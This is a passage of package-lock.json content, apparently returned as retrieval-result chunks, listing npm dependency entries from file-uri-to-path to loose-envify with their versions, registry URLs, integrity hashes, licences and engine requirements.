\"dependencies\": {\n        \"node-domexception\": \"^1.0.0\",\n        \"web-streams-polyfill\": \"^3.0.3\"\n      },\n      \"engines\": {\n        \"node\": \"^12.20 || >= 14.13\"\n      }\n    },\n    \"node_modules/file-uri-to-path\": {\n      \"version\": \"1.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/file-uri-to-path/-/file-uri-to-path-1.0.0.tgz\",\n      \"integrity\": \"sha512-0Zt+s3L7Vf1biwWZ29aARiVYLx7iMGnEUl9x33fbB/j3jR81u/O2LbqK+Bm1CDSNDKVtJ/YjwY7TUd5SkeLQLw==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/find-my-way\": {\n      \"version\": \"8.2.2\",\n      \"resolved\": \"https://registry.npmjs.org/find-my-way/-/find-my-way-8.2.2.tgz\",\n      \"integrity\": \"sha512-Dobi7gcTEq8yszimcfp/R7+owiT4WncAJ7VTTgFH1jYJ5GaG1FbhjwDG820hptN0QDFvzVY3RfCzdInvGPGzjA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"fast-deep-equal\": \"^3.1.3\",\n        \"fast-querystring\": \"^1.0.0\",\n        \"safe-regex2\": \"^3.1.0\"\n      },\n      \"engines\": {\n        \"node\": \">=14\"\n      }\n    },\n    \"node_modules/foreground-child\": {\n      \"version\": \"3.3.1\",\n      \"resolved\": \"https://registry.npmjs.org/foreground-child/-/foreground-child-3.3.1.tgz\",\n      \"integrity\": \"sha512-gIXjKqtFuWEgzFRJA9WCQeSJLZDjgJUOMCMzxtvFq/37KojM1BFGufqsCy0r4qSQmYLsZYMeyRqzIWOMup03sw==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"cross-spawn\": \"^7.0.6\",\n        \"signal-exit\": \"^4.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">=14\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/isaacs\"\n      }\n    },\n    \"node_modules/form-data\": {\n      \"version\": \"4.0.5\",\n      \"resolved\": \"https://registry.npmjs.org/form-data/-/form-data-4.0.5.tgz\",\n      \"integrity\": \"sha512-8RipRLol37bNs2bhoV67fiTEvdTrbMUYcFTiy3+wuuOnUog2QBHCZWXDRijWQfAkhBj2Uf5UnVaiWwA5vdd82w==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"asynckit\": \"^0.4.0\",\n        \"combined-stream\": \"^1.0.8\",\n        \"es-set-tostringtag\": \"^2.1.0\",\n        \"hasown\": \"^2.0.2\",\n        \"mime-types\": \"^2.1.12\"\n      },\n      \"engines\": {\n        \"node\": \">= 6\"\n      }\n    },\n    \"node_modules/formdata-polyfill\": {\n      \"version\": \"4.0.10\",\n      \"resolved\": \"https://registry.npmjs.org/formdata-polyfill/-/formdata-polyfill-4.0.10.tgz\",\n      \"integrity\": \"sha512-buewHzMvYL29jdeQTVILecSaZKnt/RJWjoZCF5OW60Z67/GmSLBkOFM7qh1PI3zFNtJbaZL5eQu1vLfazOwj4g==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"fetch-blob\": \"^3.1.2\"\n      },\n      \"engines\": {\n        \"node\": \">=12.20.0\"\n      }\n    },\n    \"node_modules/forwarded\": {\n      \"version\": \"0.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/forwarded/-/forwarded-0.2.0.tgz\",\n      \"integrity\": \"sha512-buRG0fpBtRHSTCOASe6hD258tEubFoRLb4ZNA6NxMVHNw2gOcwHo9wyablzMzOA5z9xA9L1KNjk/Nt6MT9aYow==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.6\"\n      }\n    },\n    \"node_modules/fs-constants\": {\n      \"version\": \"1.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/fs-constants/-/fs-constants-1.0.0.tgz\",\n      \"integrity\": \"sha512-y6OAwoSIf7FyjMIv94u+b5rdheZEjzR63GTyZJm5qh4Bi+2YgwLCcI/fPFZkL5PSixOt6ZNKm+w+Hfp/Bciwow==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/fs-minipass\": {\n      \"version\": \"2.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/fs-minipass/-/fs-minipass-2.1.0.tgz\",\n      \"integrity\": \"sha512-V/JgOLFCS+R6Vcq0slCuaeWEdNC3ouDlJMNIsacH2VtALiu9mV4LPrHc5cDl8k5aw6J8jwgWWpiTo5RYhmIzvg==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"minipass\": \"^3.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">= 8\"\n      }\n    },\n    \"node_modules/fs-minipass/node_modules/minipass\": {\n      \"version\": \"3.3.6\",\n      \"resolved\": \"https://registry.npmjs.org/minipass/-/minipass-3.3.6.tgz\",\n      \"integrity\": \"sha512-DxiNidxSEK+tHG6zOIklvNOwm3hvCrbUrdtzY74U6HKTJxvIDfOUL5W5P2Ghd3DTkhhKPYGqeNUIh5qcM4YBfw==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"yallist\": \"^4.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/fs-minipass/node_modules/yallist\": {\n      \"version\": \"4.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/yallist/-/yallist-4.0.0.tgz\",\n      \"integrity\": \"sha512-3wdGidZyq5PB084XLES5TpOSRA3wjXAlIWMhum2kRcv/41Sn2emQ0dycQW4uZXLejwKvg6EsvbdlVL+FYEct7A==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/fs.realpath\": {\n      \"version\": \"1.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/fs.realpath/-/fs.realpath-1.0.0.tgz\",\n      \"integrity\": \"sha512-OO0pH2lK6a0hZnAdau5ItzHPI6pUlvI7jMVnxUQRtw4owF2wk8lOSabtGDCTP4Ggrg2MbGnWO9X8K1t4+fGMDw==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/fsevents\": {\n      \"version\": \"2.3.3\",", "metadata": {"file": "package-lock.json", "start_line": 3001, "end_line": 3200, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:3201", "score": 0.0, "content": "      \"resolved\": \"https://registry.npmjs.org/fsevents/-/fsevents-2.3.3.tgz\",\n      \"integrity\": \"sha512-5xoDfX+fL7faATnagmWPpbFtwh/R77WmMMqqHGS65C3vvB0YHrgF+B1YmZ3441tMj5n63k0212XNoJwzlhffQw==\",\n      \"dev\": true,\n      \"hasInstallScript\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"darwin\"\n      ],\n      \"engines\": {\n        \"node\": \"^8.16.0 || ^10.6.0 || >=11.0.0\"\n      }\n    },\n    \"node_modules/function-bind\": {\n      \"version\": \"1.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/function-bind/-/function-bind-1.1.2.tgz\",\n      \"integrity\": \"sha512-7XHNxH7qX9xG5mIwxkhumTox/MIRNcOgDrxWsMt2pAr23WHp6MrRlN7FBSFpCpr+oVO0F744iUgR82nJMfG2SA==\",\n      \"license\": \"MIT\",\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/ljharb\"\n      }\n    },\n    \"node_modules/gauge\": {\n      \"version\": \"3.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/gauge/-/gauge-3.0.2.tgz\",\n      \"integrity\": \"sha512-+5J6MS/5XksCuXq++uFRsnUd7Ovu1XenbeuIuNRJxYWjgQbPuFhT14lAvsWfqfAmnwluf1OwMjz39HjfLPci0Q==\",\n      \"deprecated\": \"This package is no longer supported.\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"aproba\": \"^1.0.3 || ^2.0.0\",\n        \"color-support\": \"^1.1.2\",\n        \"console-control-strings\": \"^1.0.0\",\n        \"has-unicode\": \"^2.0.1\",\n        \"object-assign\": \"^4.1.1\",\n        \"signal-exit\": \"^3.0.0\",\n        \"string-width\": \"^4.2.3\",\n        \"strip-ansi\": \"^6.0.1\",\n        \"wide-align\": \"^1.1.2\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/gauge/node_modules/signal-exit\": {\n      \"version\": \"3.0.7\",\n      \"resolved\": \"https://registry.npmjs.org/signal-exit/-/signal-exit-3.0.7.tgz\",\n      \"integrity\": \"sha512-wnD2ZE+l+SPC/uoS0vXeE9L1+0wuaMqKlfz9AMUo38JsyLSBWSFcHR1Rri62LZc12vLr1gb3jl7iwQhgwpAbGQ==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/gensync\": {\n      \"version\": \"1.0.0-beta.2\",\n      \"resolved\": \"https://registry.npmjs.org/gensync/-/gensync-1.0.0-beta.2.tgz\",\n      \"integrity\": \"sha512-3hN7NaskYvMDLQY55gnW3NQ+mesEAepTqlg+VEbj7zzqEMBVNhzcGYYeqFo/TlYz6eQiFcp1HcsCZO+nGgS8zg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6.9.0\"\n      }\n    },\n    \"node_modules/get-caller-file\": {\n      \"version\": \"2.0.5\",\n      \"resolved\": \"https://registry.npmjs.org/get-caller-file/-/get-caller-file-2.0.5.tgz\",\n      \"integrity\": \"sha512-DyFP3BM/3YHTQOCUL/w0OZHR0lpKeGrxotcHWcqNEdnltqFwXVfhEBQ94eIo34AfQpo0rGki4cyIiftY06h2Fg==\",\n      \"dev\": true,\n      \"license\": \"ISC\",\n      \"engines\": {\n        \"node\": \"6.* || 8.* || >= 10.*\"\n      }\n    },\n    \"node_modules/get-func-name\": {\n      \"version\": \"2.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/get-func-name/-/get-func-name-2.0.2.tgz\",\n      \"integrity\": \"sha512-8vXOvuE167CtIc3OyItco7N/dpRtBbYOsPsXCz7X/PMnlGjYjSGuZJgM1Y7mmew7BKf9BqvLX2tnOVy1BBUsxQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \"*\"\n      }\n    },\n    \"node_modules/get-intrinsic\": {\n      \"version\": \"1.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/get-intrinsic/-/get-intrinsic-1.3.0.tgz\",\n      \"integrity\": \"sha512-9fSjSaos/fRIVIp+xSJlE6lfwhES7LNtKaCBIamHsjr2na1BiABJPo0mOjjz8GJDURarmCPGqaiVg5mfjb98CQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"call-bind-apply-helpers\": \"^1.0.2\",\n        \"es-define-property\": \"^1.0.1\",\n        \"es-errors\": \"^1.3.0\",\n        \"es-object-atoms\": \"^1.1.1\",\n        \"function-bind\": \"^1.1.2\",\n        \"get-proto\": \"^1.0.1\",\n        \"gopd\": \"^1.2.0\",\n        \"has-symbols\": \"^1.1.0\",\n        \"hasown\": \"^2.0.2\",\n        \"math-intrinsics\": \"^1.1.0\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/ljharb\"\n      }\n    },\n    \"node_modules/get-proto\": {\n      \"version\": \"1.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/get-proto/-/get-proto-1.0.1.tgz\",\n      \"integrity\": \"sha512-sTSfBjoXBp89JvIKIefqw7U2CCebsc74kiY6awiGogKtoSGbgjYE/G/+l9sF3MWFPNc9IcoOC4ODfKHfxFmp0g==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"dunder-proto\": \"^1.0.1\",\n        \"es-object-atoms\": \"^1.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      }\n    },\n    \"node_modules/get-stream\": {\n      \"version\": \"8.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/get-stream/-/get-stream-8.0.1.tgz\",\n      \"integrity\": \"sha512-VaUJspBffn/LMCJVoMvSAdmscJyS1auj5Zulnn5UoYcY531UWmdwhRWkcGKnGU93m5HSXP9LP2usOryrBtQowA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=16\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/get-tsconfig\": {\n      \"version\": \"4.13.0\",\n      \"resolved\": \"https://registry.npmjs.org/get-tsconfig/-/get-tsconfig-4.13.0.tgz\",\n      \"integrity\": \"sha512-1VKTZJCwBrvbd+Wn3AOgQP/2Av+TfTCOlE4AcRJE72W1ksZXbAx8PPBR9RzgTeSPzlPMHrbANMH3LbltH73wxQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"resolve-pkg-maps\": \"^1.0.0\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/privatenumber/get-tsconfig?sponsor=1\"\n      }\n    },\n    \"node_modules/github-from-package\": {\n      \"version\": \"0.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/github-from-package/-/github-from-package-0.0.0.tgz\",\n      \"integrity\": \"sha512-SyHy3T1v2NUXn29OsWdxmK6RwHD+vkj3v8en8AOBZ1wBQ/hCAQ5bAQTD02kW4W9tUp/3Qh6J8r9EvntiyCmOOw==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/glob\": {\n      \"version\": \"10.5.0\",\n      \"resolved\": \"https://registry.npmjs.org/glob/-/glob-10.5.0.tgz\",\n      \"integrity\": \"sha512-DfXN8DfhJ7NH3Oe7cFmu3NCu1wKbkReJ8TorzSAFbSKrlNaQSKfIzqYqVY8zlbs2NLBbWpRiU52GX2PbaBVNkg==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"foreground-child\": \"^3.1.0\",\n        \"jackspeak\": \"^3.1.2\",\n        \"minimatch\": \"^9.0.4\",\n        \"minipass\": \"^7.1.2\",\n        \"package-json-from-dist\": \"^1.0.0\",\n        \"path-scurry\": \"^1.11.1\"\n      },\n      \"bin\": {\n        \"glob\": \"dist/esm/bin.mjs\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/isaacs\"\n      }\n    },\n    \"node_modules/gopd\": {\n      \"version\": \"1.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/gopd/-/gopd-1.2.0.tgz\",\n      \"integrity\": \"sha512-ZUKRh6/kUFoAiTAtTYPZJ3hw9wNxx+BIBOijnlG9PnrJsCcSjs1wyyD6vJpaYtgnzDrKYRSqf3OO6Rfa93xsRg==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/ljharb\"\n      }\n    },\n    \"node_modules/has-flag\": {\n      \"version\": \"4.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/has-flag/-/has-flag-4.0.0.tgz\",\n      \"integrity\": \"sha512-EykJT/Q1KjTWctppgIAgfSO0tKVuZUjhgMr17kqTumMl6Afv3EISleU7qZUzoXDFTAHTDC4NOoG/ZxU3EvlMPQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/has-symbols\": {\n      \"version\": \"1.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/has-symbols/-/has-symbols-1.1.0.tgz\",\n      \"integrity\": \"sha512-1cDNdwJ2Jaohmb3sg4OmKaMBwuC48sYni5HUw2DvsC8LjGTLK9h+eb1X6RyuOHe4hT0ULCW68iomhjUoKUqlPQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/ljharb\"", "metadata": {"file": "package-lock.json", "start_line": 3201, "end_line": 3400, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:3401", "score": 0.0, "content": "      }\n    },\n    \"node_modules/has-tostringtag\": {\n      \"version\": \"1.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/has-tostringtag/-/has-tostringtag-1.0.2.tgz\",\n      \"integrity\": \"sha512-NqADB8VjPFLM2V0VvHUewwwsw0ZWBaIdgo+ieHtK3hasLz4qeCRjYcqfB6AQrBggRKppKF8L52/VqdVsO47Dlw==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"has-symbols\": \"^1.0.3\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/ljharb\"\n      }\n    },\n    \"node_modules/has-unicode\": {\n      \"version\": \"2.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/has-unicode/-/has-unicode-2.0.1.tgz\",\n      \"integrity\": \"sha512-8Rf9Y83NBReMnx0gFzA8JImQACstCYWUplepDa9xprwwtmgEZUF0h/i5xSA625zB/I37EtrswSST6OXxwaaIJQ==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/hasown\": {\n      \"version\": \"2.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/hasown/-/hasown-2.0.2.tgz\",\n      \"integrity\": \"sha512-0hJU9SCPvmMzIBdZFqNPXWa6dqh7WdH0cII9y+CyS8rG3nL48Bclra9HmKhVVUHyPWNH5Y7xDwAB7bfgSjkUMQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"function-bind\": \"^1.1.2\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      }\n    },\n    \"node_modules/helmet\": {\n      \"version\": \"7.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/helmet/-/helmet-7.2.0.tgz\",\n      \"integrity\": \"sha512-ZRiwvN089JfMXokizgqEPXsl2Guk094yExfoDXR0cBYWxtBbaSww/w+vT4WEJsBW2iTUi1GgZ6swmoug3Oy4Xw==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=16.0.0\"\n      }\n    },\n    \"node_modules/help-me\": {\n      \"version\": \"5.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/help-me/-/help-me-5.0.0.tgz\",\n      \"integrity\": \"sha512-7xgomUX6ADmcYzFik0HzAxh/73YlKR9bmFzf51CZwR+b6YtzU2m0u49hQCqV6SvlqIqsaxovfwdvbnsw3b/zpg==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/http-errors\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/http-errors/-/http-errors-2.0.0.tgz\",\n      \"integrity\": \"sha512-FtwrG/euBzaEjYeRqOgly7G0qviiXoJWnvEH2Z1plBdXgbyjv34pHTSb9zoeHMyDy33+DWy5Wt9Wo+TURtOYSQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"depd\": \"2.0.0\",\n        \"inherits\": \"2.0.4\",\n        \"setprototypeof\": \"1.2.0\",\n        \"statuses\": \"2.0.1\",\n        \"toidentifier\": \"1.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.8\"\n      }\n    },\n    \"node_modules/https-proxy-agent\": {\n      \"version\": \"5.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/https-proxy-agent/-/https-proxy-agent-5.0.1.tgz\",\n      \"integrity\": \"sha512-dFcAjpTQFgoLMzC2VwU+C/CbS7uRL0lWmxDITmqm7C+7F0Odmj6s9l6alZc6AELXhrnggM2CeWSXHGOdX2YtwA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"agent-base\": \"6\",\n        \"debug\": \"4\"\n      },\n      \"engines\": {\n        \"node\": \">= 6\"\n      }\n    },\n    \"node_modules/human-signals\": {\n      \"version\": \"5.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/human-signals/-/human-signals-5.0.0.tgz\",\n      \"integrity\": \"sha512-AXcZb6vzzrFAUE61HnN4mpLqd/cSIwNQjtNWR0euPm6y0iqx3G4gOXaIDdtdDwZmhwe82LA6+zinmW4UBWVePQ==\",\n      \"dev\": true,\n      \"license\": \"Apache-2.0\",\n      \"engines\": {\n        \"node\": \">=16.17.0\"\n      }\n    },\n    \"node_modules/ieee754\": {\n      \"version\": \"1.2.1\",\n      \"resolved\": \"https://registry.npmjs.org/ieee754/-/ieee754-1.2.1.tgz\",\n      \"integrity\": \"sha512-dcyqhDvX1C46lXZcVqCpK+FtMRQVdIMN6/Df5js2zouUsqG7I6sFxitIC+7KYK29KdXOLHdu9zL4sFnoVQnqaA==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/feross\"\n        },\n        {\n          \"type\": \"patreon\",\n          \"url\": \"https://www.patreon.com/feross\"\n        },\n        {\n          \"type\": \"consulting\",\n          \"url\": \"https://feross.org/support\"\n        }\n      ],\n      \"license\": \"BSD-3-Clause\"\n    },\n    \"node_modules/inflight\": {\n      \"version\": \"1.0.6\",\n      \"resolved\": \"https://registry.npmjs.org/inflight/-/inflight-1.0.6.tgz\",\n      \"integrity\": \"sha512-k92I/b08q4wvFscXCLvqfsHCrjrF7yiXsQuIVvVE7N82W3+aqpzuUdBbfhWcy/FZR3/4IgflMgKLOsvPDrGCJA==\",\n      \"deprecated\": \"This module is not supported, and leaks memory. Do not use it. Check out lru-cache if you want a good and tested way to coalesce async requests by a key value, which is much more comprehensive and powerful.\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"once\": \"^1.3.0\",\n        \"wrappy\": \"1\"\n      }\n    },\n    \"node_modules/inherits\": {\n      \"version\": \"2.0.4\",\n      \"resolved\": \"https://registry.npmjs.org/inherits/-/inherits-2.0.4.tgz\",\n      \"integrity\": \"sha512-k/vGaX4/Yla3WzyMCvTQOXYeIHvqOKtnqBduzTHpzpQZzAskKMhZ2K+EnBiSM9zGSoIFeMpXKxa4dYeZIQqewQ==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/ini\": {\n      \"version\": \"1.3.8\",\n      \"resolved\": \"https://registry.npmjs.org/ini/-/ini-1.3.8.tgz\",\n      \"integrity\": \"sha512-JV/yugV2uzW5iMRSiZAyDtQd+nxtUnjeLt0acNdw98kKLrvuRVyB80tsREOE7yvGVgalhZ6RNXCmEHkUKBKxew==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/ipaddr.js\": {\n      \"version\": \"1.9.1\",\n      \"resolved\": \"https://registry.npmjs.org/ipaddr.js/-/ipaddr.js-1.9.1.tgz\",\n      \"integrity\": \"sha512-0KI/607xoxSToH7GjN1FfSbLoU0+btTicjsQSWQlh/hZykN8KpmMf7uYwPW3R+akZ6R/w18ZlXSHBYXiYUPO3g==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.10\"\n      }\n    },\n    \"node_modules/is-fullwidth-code-point\": {\n      \"version\": \"3.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/is-fullwidth-code-point/-/is-fullwidth-code-point-3.0.0.tgz\",\n      \"integrity\": \"sha512-zymm5+u+sCsSWyD9qNaejV3DFvhCKclKdizYaJUuHA83RLjb7nSuGnddCHGv0hk+KY7BMAlsWeK4Ueg6EV6XQg==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/is-stream\": {\n      \"version\": \"3.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/is-stream/-/is-stream-3.0.0.tgz\",\n      \"integrity\": \"sha512-LnQR4bZ9IADDRSkvpqMGvt/tEJWclzklNgSw48V5EAaAeDd6qGvN8ei6k5p0tvxSR171VmGyHuTiAOfxAbr8kA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \"^12.20.0 || ^14.13.1 || >=16.0.0\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/isexe\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/isexe/-/isexe-2.0.0.tgz\",\n      \"integrity\": \"sha512-RHxMLp9lnKHGHRng9QFhRCMbYAcVpn69smSGcq3f36xjgVVWThj4qqLbTLlq7Ssj8B+fIQ1EuCEGI2lKsyQeIw==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/jackspeak\": {\n      \"version\": \"3.4.3\",\n      \"resolved\": \"https://registry.npmjs.org/jackspeak/-/jackspeak-3.4.3.tgz\",\n      \"integrity\": \"sha512-OGlZQpz2yfahA/Rd1Y8Cd9SIEsqvXkLVoSw/cgwhnhFMDbsQFeZYoJJ7bIZBS9BcamUW96asq/npPWugM+RQBw==\",\n      \"license\": \"BlueOak-1.0.0\",\n      \"dependencies\": {\n        \"@isaacs/cliui\": \"^8.0.2\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/isaacs\"\n      },\n      \"optionalDependencies\": {\n        \"@pkgjs/parseargs\": \"^0.11.0\"\n      }\n    },\n    \"node_modules/joycon\": {\n      \"version\": \"3.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/joycon/-/joycon-3.1.1.tgz\",\n      \"integrity\": \"sha512-34wB/Y7MW7bzjKRjUKTa46I2Z7eV62Rkhva+KkopW7Qvv/OSWBqvkSY7vusOPrNuZcUG3tApvdVgNB8POj3SPw==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/js-tokens\": {\n      \"version\": \"4.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/js-tokens/-/js-tokens-4.0.0.tgz\",\n      \"integrity\": \"sha512-RdJUflcE3cUzKiMqQgsCu06FPu9UdIJO0beYbPhHN4k6apgJtifcoCtT9bcxOpYBtpD2kCM6Sbzg4CausW/PKQ==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/jsesc\": {", "metadata": {"file": "package-lock.json", "start_line": 3401, "end_line": 3600, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:3601", "score": 0.0, "content": "      \"version\": \"3.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/jsesc/-/jsesc-3.1.0.tgz\",\n      \"integrity\": \"sha512-/sM3dO2FOzXjKQhJuo0Q173wf2KOo8t4I8vHy6lF9poUp7bKT0/NHE8fPX23PwfhnykfqnC2xRxOnVw5XuGIaA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"bin\": {\n        \"jsesc\": \"bin/jsesc\"\n      },\n      \"engines\": {\n        \"node\": \">=6\"\n      }\n    },\n    \"node_modules/json-schema-ref-resolver\": {\n      \"version\": \"1.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/json-schema-ref-resolver/-/json-schema-ref-resolver-1.0.1.tgz\",\n      \"integrity\": \"sha512-EJAj1pgHc1hxF6vo2Z3s69fMjO1INq6eGHXZ8Z6wCQeldCuwxGK9Sxf4/cScGn3FZubCVUehfWtcDM/PLteCQw==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"fast-deep-equal\": \"^3.1.3\"\n      }\n    },\n    \"node_modules/json-schema-traverse\": {\n      \"version\": \"1.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/json-schema-traverse/-/json-schema-traverse-1.0.0.tgz\",\n      \"integrity\": \"sha512-NM8/P9n3XjXhIZn1lLhkFaACTOURQXjWhV4BA/RnOv8xvgqtqpAX9IO4mRQxSx1Rlo4tqzeqb0sOlruaOy3dug==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/json5\": {\n      \"version\": \"2.2.3\",\n      \"resolved\": \"https://registry.npmjs.org/json5/-/json5-2.2.3.tgz\",\n      \"integrity\": \"sha512-XmOWe7eyHYH14cLdVPoyg+GOH3rYX++KpzrylJwSW98t3Nk+U8XOl8FWKOgwtzdb8lXGf6zYwDUzeHMWfxasyg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"bin\": {\n        \"json5\": \"lib/cli.js\"\n      },\n      \"engines\": {\n        \"node\": \">=6\"\n      }\n    },\n    \"node_modules/light-my-request\": {\n      \"version\": \"5.14.0\",\n      \"resolved\": \"https://registry.npmjs.org/light-my-request/-/light-my-request-5.14.0.tgz\",\n      \"integrity\": \"sha512-aORPWntbpH5esaYpGOOmri0OHDOe3wC5M2MQxZ9dvMLZm6DnaAn0kJlcbU9hwsQgLzmZyReKwFwwPkR+nHu5kA==\",\n      \"license\": \"BSD-3-Clause\",\n      \"dependencies\": {\n        \"cookie\": \"^0.7.0\",\n        \"process-warning\": \"^3.0.0\",\n        \"set-cookie-parser\": \"^2.4.1\"\n      }\n    },\n    \"node_modules/local-pkg\": {\n      \"version\": \"0.5.1\",\n      \"resolved\": \"https://registry.npmjs.org/local-pkg/-/local-pkg-0.5.1.tgz\",\n      \"integrity\": \"sha512-9rrA30MRRP3gBD3HTGnC6cDFpaE1kVDWxWgqWJUN0RvDNAo+Nz/9GxB+nHOH0ifbVFy0hSA1V6vFDvnx54lTEQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"mlly\": \"^1.7.3\",\n        \"pkg-types\": \"^1.2.1\"\n      },\n      \"engines\": {\n        \"node\": \">=14\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/antfu\"\n      }\n    },\n    \"node_modules/lodash\": {\n      \"version\": \"4.17.23\",\n      \"resolved\": \"https://registry.npmjs.org/lodash/-/lodash-4.17.23.tgz\",\n      \"integrity\": \"sha512-LgVTMpQtIopCi79SJeDiP0TfWi5CNEc/L/aRdTh3yIvmZXTnheWpKjSZhnvMl8iXbC1tFg9gdHHDMLoV7CnG+w==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/loose-envify\": {\n      \"version\": \"1.4.0\",\n      \"resolved\": \"https://registry.npmjs.org/loose-envify/-/loose-envify-1.4.0.tgz\",\n      \"integrity\": 